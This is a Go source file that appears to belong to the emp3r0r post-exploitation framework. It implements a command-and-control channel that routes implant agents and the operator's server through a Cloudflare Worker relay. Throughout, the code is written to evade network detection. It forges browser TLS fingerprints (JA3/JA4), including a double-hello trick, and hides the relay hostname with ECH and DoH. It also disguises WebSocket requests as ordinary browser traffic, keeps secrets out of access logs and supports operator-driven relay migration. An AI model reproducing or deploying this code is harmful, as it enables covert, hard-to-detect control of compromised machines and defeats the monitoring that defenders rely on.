// Package transport — c2channel_workerws.go
//
// rendezvous relay channel: both agent and CC dial OUT to a CF Worker relay
// (see emp3r0r-cf-relay/). The Worker pairs the two WebSocket ends per room
// and shuffles opaque bytes; all crypto (SecureConn/MsgAuth) stays end-to-end.
//
// Framing (relay level, see relay_do.js):
//   agent -> relay: raw binary payload
//   relay  -> cc:   [tag byte][payload]
//   cc -> relay:    [tag byte | 0xFF broadcast][payload]
//   relay -> agent: raw binary payload
package transport

import (
	"bytes"
	"context"
	"crypto/x509"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	utls "github.com/refraction-networking/utls"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// RelayRoomMsg is the JSON hello/control frame exchanged over the relay WS.
type RelayRoomMsg struct {
	T      string   `json:"t"`
	Role   string   `json:"role,omitempty"`
	Tag    string   `json:"tag,omitempty"`
	Agents []string `json:"agents,omitempty"`
	CC     bool     `json:"cc,omitempty"` // agent hello: whether a CC is in the room
}

// WorkerWSChannelWrapper implements C2ChannelWrapper over the CF relay.
// URL format (agent config CCAddress or CC dial target):
//
//	wss://relay.example.com/ws/<room>?role=<cc|agent>&secret=<shared>
type WorkerWSChannelWrapper struct {
	// TagByte is the relay-level routing marker for CC->agent frames.
	// Agents ignore it (relay strips it before delivery); CC sets it.
	Role string // "agent" (default) or "cc"
}

func init() {
	RegisterC2Channel("worker_ws", "Rendezvous relay over Cloudflare Worker (both ends dial out)", &WorkerWSChannelWrapper{})
}

// ---- shared plumbing --------------------------------------------------------

// relayTLSRootCAs optionally overrides the system root pool used to verify
// relay endpoints (used by tests to trust a local TLS server).
var relayTLSRootCAs *x509.CertPool

// alpnH1 / alpnH2Capable — the two ALPN lists we ever offer. The h2-capable
// list is what real browsers send (Chrome: h2,http/1.1); the JA4 part-1
// "h2" suffix only appears on those hellos. Our consumers (gorilla WS
// upgrade, Go http1 transports) can only speak http/1.1, so an h2-capable
// hello is a probe: if the edge negotiates h2 we close and re-dial h1-only
// (double-hello, see browserTLSConnect).
var (
	alpnH1        = []string{"http/1.1"}
	alpnH2Capable = []string{"h2", "http/1.1"}
)

// h2ProbeRoll decides whether a connection starts with the h2-capable
// Chrome hello. Package var so tests can force the probe path.
var h2ProbeRoll = func() bool { return util.RandInt(0, 2) == 0 }

// browserHelloSpecs builds browser-mimicking ClientHello specs (Chrome /
// Firefox / iOS) with one surgical change: the ALPN extension is set to
// the given list. Everything else — cipher suites, extensions, curves,
// GREASE — stays exactly as the browser sends it, so the JA3/JA4
// fingerprint looks authentic.
func browserHelloSpecs(alpn []string) ([]*utls.ClientHelloSpec, error) {
	ids := []utls.ClientHelloID{
		utls.HelloChrome_Auto,
		utls.HelloFirefox_Auto,
		utls.HelloIOS_Auto,
	}
	var specs []*utls.ClientHelloSpec
	for _, id := range ids {
		spec, err := utls.UTLSIdToSpec(id)
		if err != nil {
			return nil, err
		}
		replaced := false
		for i, ext := range spec.Extensions {
			if _, ok := ext.(*utls.ALPNExtension); ok {
				spec.Extensions[i] = &utls.ALPNExtension{AlpnProtocols: alpn}
				replaced = true
			}
		}
		if replaced {
			specs = append(specs, &spec)
		}
	}
	return specs, nil
}

// dialRelayTLS dials TCP and completes a uTLS handshake for relay WSS
// connections (both agent and CC sides).
//
// The ClientHello mimics a real browser (randomly picked among Chrome,
// Firefox, iOS — the most common fingerprints on any network) with ALPN
// pinned to http/1.1 so the WebSocket upgrade works. If spec generation
// fails for any reason we fall back to HelloRandomizedNoALPN (fresh random
// JA3 per connection, no ALPN => HTTP/1.1) — still far from Go's static
// fingerprint.
// relayEdgeCache remembers relay edge IPs that actually accepted a
// connection, per hostname — future dials try them first, saving the DoH
// query entirely. In-memory only (one agent process = one edge anyway).
var (
	relayEdgeMu      sync.Mutex
	relayLearnedEdge = map[string]string{} // host -> ip:port that worked
)

func rememberRelayEdge(host, ipPort string) {
	relayEdgeMu.Lock()
	relayLearnedEdge[host] = ipPort
	relayEdgeMu.Unlock()
}

func learnedRelayEdge(host string) string {
	relayEdgeMu.Lock()
	defer relayEdgeMu.Unlock()
	return relayLearnedEdge[host]
}

// relayDialCandidates returns the ordered dial targets for a relay host:
// the learned edge first, then IPs resolved via net.DefaultResolver (the
// agent's pinned DoH — zero plaintext DNS) shuffled for distribution, and
// an empty slice when resolution fails (caller falls back to the OS
// resolver).
func relayDialCandidates(ctx context.Context, host, port string) []string {
	var cands []string
	if pin := learnedRelayEdge(host); pin != "" {
		cands = append(cands, pin)
	}
	ips, err := net.DefaultResolver.LookupHost(ctx, host)
	if err != nil || len(ips) == 0 {
		return cands
	}
	// deterministic-enough shuffle: rotate by a random offset
	off := util.RandInt(0, len(ips))
	for i := range ips {
		ip := ips[(i+off)%len(ips)]
		cand := net.JoinHostPort(ip, port)
		if cand != learnedRelayEdge(host) {
			cands = append(cands, cand)
		}
	}
	return cands
}

// dialRelayTLS connects to the relay with browser-fingerprint TLS.
//
// Resolution order (closing the last plaintext-DNS leak):
//  1. learned edge IPs from previous successful dials (no lookup at all)
//  2. DoH resolution — net.DefaultResolver is the agent's pinned DoH once
//     installed, so the relay hostname never hits the system resolver
//  3. direct addr dial (OS resolver) — availability fallback when DoH is
//     broken or not configured
func dialRelayTLS(ctx context.Context, network, addr string) (net.Conn, error) {
	host, port, splitErr := net.SplitHostPort(addr)
	dial := func() (net.Conn, error) {
		if splitErr == nil && host != "" {
			for _, cand := range relayDialCandidates(ctx, host, port) {
				conn, err := (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, "tcp4", cand)
				if err == nil {
					rememberRelayEdge(host, cand)
					return conn, nil
				}
			}
		}
		// fallback: OS resolution (same behavior as before DoH pinning)
		return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, "tcp4", addr)
	}
	return browserTLSConnect(dial, addr)
}

// negotiatedIsHTTP1 reports whether a completed handshake can carry our
// HTTP/1.1 consumers: either the server selected http/1.1 or it declined
// to pick any ALPN protocol (http/1.1 by default).
func negotiatedIsHTTP1(u *utls.UConn) bool {
	np := u.ConnectionState().NegotiatedProtocol
	return np == "http/1.1" || np == ""
}

// browserHandshake wraps an established TCP connection in uTLS with a
// randomized browser ClientHello (ALPN per the h2 flag). host may be a
// host:port pair or a bare hostname; only the hostname is used for SNI and
// certificate validation (system root pool — the endpoint is a CF domain).
func browserHandshake(conn net.Conn, hostport string, h2 bool) (*utls.UConn, error) {
	host := hostport
	if h, _, err := net.SplitHostPort(hostport); err == nil {
		host = h
	}
	cfg := &utls.Config{ServerName: host, RootCAs: relayTLSRootCAs}
	alpn := alpnH1
	if h2 {
		alpn = alpnH2Capable
	}
	var uconn *utls.UConn
	specs, specErr := browserHelloSpecs(alpn)
	if specErr == nil && len(specs) > 0 {
		spec := specs[util.RandInt(0, len(specs))]
		uconn = utls.UClient(conn, cfg, utls.HelloCustom)
		if err := uconn.ApplyPreset(spec); err != nil {
			uconn = utls.UClient(conn, cfg, utls.HelloRandomizedNoALPN)
		}
	} else {
		uconn = utls.UClient(conn, cfg, utls.HelloRandomizedNoALPN)
	}
	uconn.SetDeadline(time.Now().Add(10 * time.Second)) // handshake must never hang
	if err := uconn.Handshake(); err != nil {
		conn.Close()
		return nil, fmt.Errorf("relay TLS handshake %s: %w", host, err)
	}
	return uconn, nil
}

// BrowserLikeTLSDial dials host:port and performs the same randomized
// browser-fingerprint uTLS handshake the relay WS channel uses. Agent-side
// HTTPS clients (the DoH transport, /extip) must use this: the default Go
// http.Client ClientHello is a well-known non-browser — and classic
// Golang-malware — fingerprint, and would betray the WS channel's
// browser mimicry when both run on the same host.
//
// When pinnedIPs is non-empty (["ip:443", ...]) the TCP connection goes
// to those addresses directly while TLS SNI/cert validation still use the
// hostname from addr; resolving addr is skipped entirely (no plaintext
// bootstrap lookup). Pins are tried in order. Otherwise addr is resolved
// via net.DefaultResolver — the agent's DoH when installed.
func BrowserLikeTLSDial(ctx context.Context, addr string, pinnedIPs []string) (net.Conn, error) {
	dial := func() (net.Conn, error) {
		if len(pinnedIPs) > 0 {
			var lastErr error
			for _, pin := range pinnedIPs {
				conn, err := (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, "tcp4", pin)
				if err != nil {
					lastErr = err
					continue
				}
				return conn, nil
			}
			if lastErr != nil {
				return nil, lastErr
			}
			return nil, fmt.Errorf("browser-like dial: no pinned IP for %s", addr)
		}
		return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, "tcp4", addr)
	}
	return browserTLSConnect(dial, addr)
}

// browserTLSConnect dials via the given closure and handshakes with ECH
// when a fresh, non-disabled ECHConfig is cached for the host — falling
// back to a fresh plain-SNI connection when ECH is rejected (CF rotated
// the config, or a middlebox resets ECH ClientHellos). Availability first:
// a failed ECH attempt disables ECH for a few minutes and triggers a
// background config refresh.
//
// Double-hello (JA4 ALPN alignment): on ~half the connections we first
// present an h2-capable browser hello ("h2,http/1.1" — the list real
// Chrome sends, so the sensor-visible JA4 ends in "h2" and matches a real
// Chrome). CF edges always negotiate h2, and our consumers (WS upgrade,
// Go http1 transports) cannot speak h2 — so we close immediately and
// re-dial with the h1-only spec. The retry close looks like an ordinary
// h2-capable client stack falling back; the connection that actually
// carries traffic always speaks http/1.1.
func browserTLSConnect(dial func() (net.Conn, error), hostport string) (*utls.UConn, error) {
	if h2ProbeRoll() {
		u, err := tlsConnectOnce(dial, hostport, true)
		if err == nil {
			if negotiatedIsHTTP1(u) {
				return u, nil // edge declined h2 — the conn is usable as-is
			}
			u.Close() // h2 negotiated, we cannot speak it — re-dial h1-only
		}
		// probe dial/handshake failed: fall through to the normal flow,
		// which dials a fresh connection
	}
	return tlsConnectOnce(dial, hostport, false)
}

// tlsConnectOnce performs one dial+handshake pass with the given ALPN
// posture (ECH when armed for the host, plain SNI otherwise).
func tlsConnectOnce(dial func() (net.Conn, error), hostport string, h2 bool) (*utls.UConn, error) {
	host := hostnameOfHostPort(hostport)
	if e := echUsable(host); e != nil {
		conn, err := dial()
		if err == nil {
			uconn, echErr := browserHandshakeECH(conn, hostport, e, h2)
			if echErr == nil {
				setECHStatus(host, "armed", "")
				return uconn, nil
			}
			logging.Infof("ECH handshake with %s failed (%v), falling back to plain SNI", host, echErr)
			setECHStatus(host, "degraded", echErr.Error())
			echDisable(host, 5*time.Minute)
			refreshECHBackground(host)
		}
	}
	conn, err := dial()
	if err != nil {
		return nil, err
	}
	return browserHandshake(conn, hostport, h2)
}

// hostnameOfHostPort splits "host:port" (or returns the input when it has
// no port).
func hostnameOfHostPort(hostport string) string {
	if h, _, err := net.SplitHostPort(hostport); err == nil {
		return h
	}
	return hostport
}

// echBrowserSpecs returns browser specs that are known to work with the
// uTLS ECH path: Chrome and iOS. Firefox's spec trips a server-side
// decode error in the ECH inner/outer extension compression (2026-09,
// utls v1.8.2) — it stays available for plain connections only.
func echBrowserSpecs(alpn []string) ([]*utls.ClientHelloSpec, error) {
	ids := []utls.ClientHelloID{utls.HelloChrome_Auto, utls.HelloIOS_Auto}
	var specs []*utls.ClientHelloSpec
	for _, id := range ids {
		spec, err := utls.UTLSIdToSpec(id)
		if err != nil {
			return nil, err
		}
		for i, ext := range spec.Extensions {
			if _, ok := ext.(*utls.ALPNExtension); ok {
				spec.Extensions[i] = &utls.ALPNExtension{AlpnProtocols: alpn}
			}
		}
		specs = append(specs, &spec)
	}
	return specs, nil
}

// browserHandshakeECH performs a browser-fingerprint handshake where the
// OUTER ClientHello masks the relay hostname behind the ECH public name;
// the HPKE-encrypted inner keeps the real SNI. Requires uTLS's spec path
// (ApplyPreset) + Config.EncryptedClientHelloConfigList.
func browserHandshakeECH(conn net.Conn, hostport string, e *echEntry, h2 bool) (*utls.UConn, error) {
	host := hostnameOfHostPort(hostport)
	cfg := &utls.Config{
		ServerName:                    host, // the INNER SNI; cert validation target
		RootCAs:                       relayTLSRootCAs,
		MinVersion:                    utls.VersionTLS13,
		EncryptedClientHelloConfigList: e.list,
	}
	alpn := alpnH1
	if h2 {
		alpn = alpnH2Capable
	}
	specs, err := echBrowserSpecs(alpn)
	if err != nil || len(specs) == 0 {
		conn.Close()
		return nil, fmt.Errorf("ech specs: %w", err)
	}
	spec := specs[util.RandInt(0, len(specs))]
	hasECH := false
	for i, ext := range spec.Extensions {
		if _, ok := ext.(*utls.SNIExtension); ok {
			// the OUTER SNI must be the public name — the library does not do
			// this for the spec-based path
			spec.Extensions[i] = &utls.SNIExtension{ServerName: e.publicName}
		}
		if _, ok := ext.(utls.EncryptedClientHelloExtension); ok {
			hasECH = true // Chrome/iOS specs carry a GREASE ECH ext already
		}
	}
	if !hasECH {
		// marker the ECH marshaler replaces with the real payload. Never
		// append when the spec already has one — a doubled ECH extension
		// yields a malformed outer the server rejects with decode_error.
		spec.Extensions = append(spec.Extensions, &utls.GREASEEncryptedClientHelloExtension{})
	}
	uconn := utls.UClient(conn, cfg, utls.HelloCustom)
	if err := uconn.ApplyPreset(spec); err != nil {
		conn.Close()
		return nil, err
	}
	uconn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := uconn.Handshake(); err != nil {
		conn.Close()
		return nil, err
	}
	return uconn, nil
}

// dohDialTLS is the DoH fetch transport dialer: browser fingerprint,
// resolved through net.DefaultResolver (the agent's DoH when installed).
func dohDialTLS(ctx context.Context, network, addr string) (net.Conn, error) {
	return BrowserLikeTLSDial(ctx, addr, nil)
}

var relayDialer = &websocket.Dialer{
	HandshakeTimeout: 15 * time.Second,
	// NetDialTLSContext: gorilla skips its own TLS handshake and uses the
	// connection we return — a *utls.UConn with a randomized ClientHello.
	NetDialTLSContext: dialRelayTLS,
	ReadBufferSize:    1 << 16,
	WriteBufferSize:   1 << 16,
}

// relayConn adapts a websocket to net.Conn-ish io.ReadWriteCloser.
type relayConn struct {
	conn   *websocket.Conn
	role   string
	tag    byte // cc side: current target agent tag byte (0xFF = broadcast)
	tagMu  sync.Mutex
	rbuf   *bytes.Buffer
	isCC   bool
	closed bool
	mu     sync.Mutex
	pingStop chan struct{} // closed by Close() to stop the keepalive pinger
	pingOnce sync.Once
}

// startPinger sends a WebSocket ping every 30s so CF's edge doesn't reap the
// connection as idle (observed as 1006 unexpected EOF after ~19-30min).
// Only the read side of each party needs to stay alive for pong replies to be
// automatic (gorilla handles pong internally); the Worker DO forwards pings
// as binary/text data frames? No — ping/pong are control frames handled by
// the WS stack on both ends, so we ping and gorilla auto-pongs; the DO's
// accept-mode socket does the same. Either way, traffic flows both directions.
func (r *relayConn) startPinger() {
	r.pingStop = make(chan struct{})
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-r.pingStop:
				return
			case <-ticker.C:
				r.mu.Lock()
				if r.closed {
					r.mu.Unlock()
					return
				}
				err := r.conn.WriteControl(websocket.PingMessage,
					[]byte("keepalive"), time.Now().Add(5*time.Second))
				r.mu.Unlock()
				if err != nil {
					return
				}
			}
		}
	}()
}

// relayMigration carries the newest relay endpoint the operator's hot
// migration asked agents to move to. relayConn surfaces close(4002) frames
// here; the agent's connect loop consumes it and re-dials the new endpoint.
var relayMigration atomic.Value // string

// SetRelayMigration records the new relay endpoint (wss://...) announced by
// the relay's migration pointer.
func SetRelayMigration(u string) {
	if u != "" {
		relayMigration.Store(u)
	}
}

// RelayMigration returns the pending migration endpoint, or "".
func RelayMigration() string {
	v, _ := relayMigration.Load().(string)
	return v
}

// relayMigrationClose reports whether a read error is the relay's migration
// close frame (4002 + wss:// reason), recording the new endpoint.
func relayMigrationClose(err error) (string, bool) {
	ce, ok := err.(*websocket.CloseError)
	if !ok || ce.Code != 4002 {
		return "", false
	}
	target := strings.TrimSpace(ce.Text)
	if !strings.HasPrefix(target, "ws://") && !strings.HasPrefix(target, "wss://") {
		return "", false
	}
	SetRelayMigration(target)
	return target, true
}

func (r *relayConn) Read(p []byte) (int, error) {
	for {
		if r.rbuf.Len() > 0 {
			return r.rbuf.Read(p)
		}
		mt, data, err := r.conn.ReadMessage()
		if err != nil {
			if target, ok := relayMigrationClose(err); ok {
				logging.Warningf("relay migrated by operator to %s, re-dialing", target)
			}
			return 0, err
		}
		if mt == websocket.TextMessage {
			// control frame from relay (hello/pong/agent-joined) — ignore on data path
			continue
		}
		if r.isCC {
			// strip tag byte
			if len(data) < 1 {
				continue
			}
			data = data[1:]
		}
		r.rbuf.Write(data)
	}
}

func (r *relayConn) Write(p []byte) (int, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.closed {
		return 0, errors.New("relay closed")
	}
	if r.isCC {
		r.tagMu.Lock()
		tag := r.tag
		r.tagMu.Unlock()
		buf := make([]byte, 0, len(p)+1)
		buf = append(buf, tag)
		buf = append(buf, p...)
		if err := r.conn.WriteMessage(websocket.BinaryMessage, buf); err != nil {
			return 0, err
		}
		return len(p), nil
	}
	if err := r.conn.WriteMessage(websocket.BinaryMessage, p); err != nil {
		return 0, err
	}
	return len(p), nil
}

func (r *relayConn) Close() error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.closed {
		return nil
	}
	r.closed = true
	if r.pingStop != nil {
		r.pingOnce.Do(func() { close(r.pingStop) })
	}
	return r.conn.Close()
}

func (r *relayConn) SetTargetAgent(tagByte byte) {
	r.tagMu.Lock()
	r.tag = tagByte
	r.tagMu.Unlock()
}

// net.Conn compatibility shims (same approach as ByteReadWriteCloser)
func (r *relayConn) LocalAddr() net.Addr                { return nil }
func (r *relayConn) RemoteAddr() net.Addr               { return nil }
func (r *relayConn) SetDeadline(t time.Time) error      { return nil }
func (r *relayConn) SetReadDeadline(t time.Time) error  { return nil }
func (r *relayConn) SetWriteDeadline(t time.Time) error { return nil }

// parseRelayURL validates the relay endpoint and extracts role/secret.
func parseRelayURL(raw string) (*url.URL, string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return nil, "", err
	}
	role := u.Query().Get("role")
	if role == "" {
		role = "agent"
	}
	if role != "agent" && role != "cc" {
		return nil, "", fmt.Errorf("bad relay role %q", role)
	}
	secret := u.Query().Get("secret") // moved to the Authorization header at dial time
	if secret == "" {
		return nil, "", fmt.Errorf("relay URL %s: missing secret", u.Redacted())
	}
	return u, role, nil
}

// dialRelay opens the relay WebSocket and waits for the hello control frame.
// For agent-role dials, it waits until a CC is present in the room (hello.cc):
// otherwise the agent sends its checkin into a void — the DO drops frames
// when no CC is joined — and blocks forever waiting for an ACK.
func dialRelay(ctx context.Context, raw string) (*relayConn, *RelayRoomMsg, error) {
	u, role, err := parseRelayURL(raw)
	if err != nil {
		return nil, nil, err
	}
	// gorilla requires ws:// or wss:// scheme
	wsURL := u.String()
	if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		// infer from scheme or default to wss for anything non-local
		scheme := "wss"
		if u.Scheme == "http" {
			scheme = "ws"
		}
		wsURL = scheme + "://" + strings.TrimPrefix(wsURL, u.Scheme+"://")
	}
	// Request obfuscation: the wire request must look like a browser
	// opening a same-origin WebSocket on an ordinary web app. The secret
	// and role ride headers (Authorization / X-Relay-Role) instead of the
	// query string — URLs land in every access log; headers don't.
	wsh := u.Query()
	wsHeaders := http.Header{
		"User-Agent":      {BrowserUserAgent()},
		"Accept-Language": {"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"},
		"Cache-Control":  {"no-cache"},
		"Pragma":          {"no-cache"},
		"Origin":         {"https://" + u.Host},
	}
	if s := wsh.Get("secret"); s != "" {
		wsHeaders.Set("Authorization", "Bearer "+s)
	}
	if r := wsh.Get("role"); r != "" {
		wsHeaders.Set("X-Relay-Role", r)
	}
	// strip the query from the request URL
	u.RawQuery = ""
	wsURL = u.String()
	deadline := time.Now().Add(30 * time.Second)
	for {
		conn, resp, err := relayDialer.DialContext(ctx, wsURL, wsHeaders)
		if err != nil {
			if resp != nil {
				// 409 + X-Relay-Migrated-To: the old deployment was repointed
				// at a newer one — record it so the agent re-dials the new endpoint.
				if mig := resp.Header.Get("X-Relay-Migrated-To"); mig != "" {
					SetRelayMigration(mig)
					return nil, nil, fmt.Errorf("relay migrated by operator to %s", mig)
				}
				return nil, nil, fmt.Errorf("relay dial: %s (HTTP %d)", err, resp.StatusCode)
			}
			return nil, nil, fmt.Errorf("relay dial: %w", err)
		}
		rc := &relayConn{conn: conn, role: role, tag: 0xFF, rbuf: new(bytes.Buffer), isCC: role == "cc"}
		// wait hello (text)
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		_, raw_hello, err := conn.ReadMessage()
		if err != nil {
			if target, ok := relayMigrationClose(err); ok {
				logging.Warningf("relay migrated by operator to %s, re-dialing", target)
			}
			_ = conn.Close()
			return nil, nil, fmt.Errorf("relay hello: %w", err)
		}
		conn.SetReadDeadline(time.Time{})
		var hello RelayRoomMsg
		if err := json.Unmarshal(raw_hello, &hello); err != nil || hello.T != "hello" {
			_ = conn.Close()
			return nil, nil, fmt.Errorf("relay hello invalid: %s", string(raw_hello)[:min(64, len(raw_hello))])
		}
		// agent must not fire its checkin into a CC-less room
		if role == "agent" && !hello.CC {
			_ = conn.Close()
			if time.Now().After(deadline) {
				return nil, nil, fmt.Errorf("relay room has no CC (waited 30s)")
			}
			time.Sleep(2 * time.Second)
			continue
		}
		rc.startPinger()
		return rc, &hello, nil
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ---- agent side: C2ChannelWrapper -------------------------------------------

// Dial implements C2ChannelWrapper (agent -> relay -> cc).
func (w *WorkerWSChannelWrapper) Dial(ctx context.Context, client *http.Client, url string) (io.ReadWriteCloser, *http.Response, error) {
	rc, hello, err := dialRelay(ctx, url)
	if err != nil {
		return nil, nil, err
	}
	_ = hello
	return rc, &http.Response{StatusCode: http.StatusOK}, nil
}

// Accept is not used on the agent side.
func (w *WorkerWSChannelWrapper) Accept(w2 http.ResponseWriter, req *http.Request) (io.ReadWriteCloser, error) {
	return nil, errors.New("Accept not implemented for worker_ws (CC uses CCRelayListener)")
}
